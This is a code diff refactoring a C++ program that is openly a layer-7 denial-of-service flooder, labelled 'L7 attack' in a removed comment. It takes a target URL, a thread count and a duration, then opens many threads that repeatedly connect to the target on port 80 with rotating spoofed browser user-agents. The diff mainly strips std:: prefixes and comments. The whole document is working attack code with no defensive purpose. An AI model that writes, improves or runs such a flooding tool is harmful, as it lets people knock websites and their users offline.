@@ -11,7 +11,9 @@
 #include <unistd.h>
 #include <arpa/inet.h>
 
-const std::vector<std::string> userAgents = {
+using namespace std;
+
+const vector<string> userAgents = {
     "Mozilla/5.0 (Linux; U; Android 2.2.1; en-ca; LG-P505R Build/FRG83) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
     "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:15.0) like Gecko",
@@ -39,20 +41,18 @@ const std::vector<std::string> userAgents = {
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.1.17 (KHTML, like Gecko) Version/7.1 Safari/537.85.10"
 };
 
-// Generate random seed
-std::string grs(int length) {
-    const std::string chars = "abcdefghijklmnopqrstuvwxyz0123456789";
-    std::string result;
+string grs(int length) {
+    const string chars = "abcdefghijklmnopqrstuvwxyz0123456789";
+    string result;
     result.resize(length);
-    std::generate_n(result.begin(), length, [&]() { return chars[rand() % chars.size()]; });
+    generate_n(result.begin(), length, [&]() { return chars[rand() % chars.size()]; });
     return result;
 }
 
-// Creates socket
-int cs(const std::string& remote, int port) {
+int cs(const string& remote, int port) {
     int sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock < 0) {
-        std::cerr << "socket creation failed\n";
+        cout << "socket creation failed\n";
         return -1;
     }
 
@@ -60,14 +60,14 @@ int cs(const std::string& remote, int port) {
     hints.ai_family = AF_INET;
     hints.ai_socktype = SOCK_STREAM;
 
-    if (getaddrinfo(remote.c_str(), std::to_string(port).c_str(), &hints, &result) != 0) {
-        std::cerr << "getaddrinfo failed\n";
+    if (getaddrinfo(remote.c_str(), to_string(port).c_str(), &hints, &result) != 0) {
+        cout << "getaddrinfo failed\n";
         close(sock);
         return -1;
     }
 
     if (connect(sock, result->ai_addr, result->ai_addrlen) < 0) {
-        std::cerr << "connection failed\n";
+        cout << "connection failed\n";
         close(sock);
         freeaddrinfo(result);
         return -1;
@@ -77,18 +77,17 @@ int cs(const std::string& remote, int port) {
     return sock;
 }
 
-// Sends requests
-void sr(int maxRequests, const std::string& host, int port, int time) {
+void sr(int maxRequests, const string& host, int port, int time) {
     int sock;
-    std::string packet;
-    std::string randSeed = grs(30);
-    std::string userAgent;
+    string packet;
+    string randSeed = grs(30);
+    string userAgent;
 
-    auto endTime = std::chrono::steady_clock::now() + std::chrono::seconds(time);
-    while (std::chrono::steady_clock::now() < endTime) {
+    auto endTime = chrono::steady_clock::now() + chrono::seconds(time);
+    while (chrono::steady_clock::now() < endTime) {
         sock = cs(host, port);
         if (sock < 0) {
-            std::this_thread::sleep_for(std::chrono::seconds(1));
+            this_thread::sleep_for(chrono::seconds(1));
             continue;
         }
 
@@ -106,16 +105,15 @@ void sr(int maxRequests, const std::string& host, int port, int time) {
     }
 }
 
-// L7 attack
-void l7(const std::string& url, int maxThreads, int time) {
-    std::string host = url.substr(url.find("//") + 2);
+void l7(const string& url, int maxThreads, int time) {
+    string host = url.substr(url.find("//") + 2);
     int port = 80;
 
-    if (size_t pos = host.find('/'); pos != std::string::npos) {
+    if (size_t pos = host.find('/'); pos != string::npos) {
         host = host.substr(0, pos);
     }
 
-    std::vector<std::thread> threads;
+    vector<thread> threads;
     for (int i = 0; i < maxThreads; ++i) {
         threads.emplace_back(sr, maxThreads, host, port, time);
     }
@@ -127,14 +125,14 @@ void l7(const std::string& url, int maxThreads, int time) {
 
 int main(int argc, char* argv[]) {
     if (argc > 2) {
-        std::srand(static_cast<unsigned>(std::time(nullptr)));
-        std::string url = argv[1];
-        int maxThreads = std::stoi(argv[2]);
-        int time = (argc > 3) ? std::stoi(argv[3]) : 0;
+        srand(static_cast<unsigned>(time(nullptr)));
+        string url = argv[1];
+        int maxThreads = stoi(argv[2]);
+        int time = (argc > 3) ? stoi(argv[3]) : 0;
 
         l7(url, maxThreads, time);
     } else {
-        std::cerr << "Usage: " << argv[0] << " [url] [threads] [time]\n";
+        cout << "Usage: " << argv[0] << " [url] [threads] [time]\n";
         return 1;
     }
 
